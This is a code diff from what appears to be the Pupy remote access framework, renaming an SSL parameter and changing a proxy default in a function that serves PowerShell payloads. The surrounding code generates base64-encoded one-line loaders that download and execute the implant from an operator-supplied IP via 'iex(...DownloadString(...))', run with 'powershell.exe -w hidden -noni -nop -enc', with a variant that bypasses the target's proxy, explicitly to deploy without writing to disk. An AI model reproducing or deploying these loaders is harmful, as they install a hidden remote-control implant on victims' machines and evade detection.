@@ -162,11 +162,11 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
             pass
         self.socket.close()
 
-def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=True, useTargetProxy=True):
+def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True):
     try:
         try:
             server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
-            server.set(conf, link_ip, port, ssl, useTargetProxy)
+            server.set(conf, link_ip, port, sslEnabled, useTargetProxy)
         except Exception as e:
             # [Errno 98] Adress already in use
             raise
@@ -174,7 +174,7 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Tr
         print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
         print " --- "
         if useTargetProxy == True:
-            if not ssl:
+            if not sslEnabled:
                 a="iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')"%(link_ip, port, url_random_one)
                 b=b64encode(a.encode('UTF-16LE'))
             else:
@@ -183,7 +183,7 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Tr
             oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message=colorize("Please note that if the target's system uses a proxy, this previous powershell command will download/execute pupy through the proxy", "yellow")
         else:
-            if not ssl:
+            if not sslEnabled:
                 a="$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')"%(link_ip, port, url_random_one)
                 b=b64encode(a.encode('UTF-16LE'))
             else:
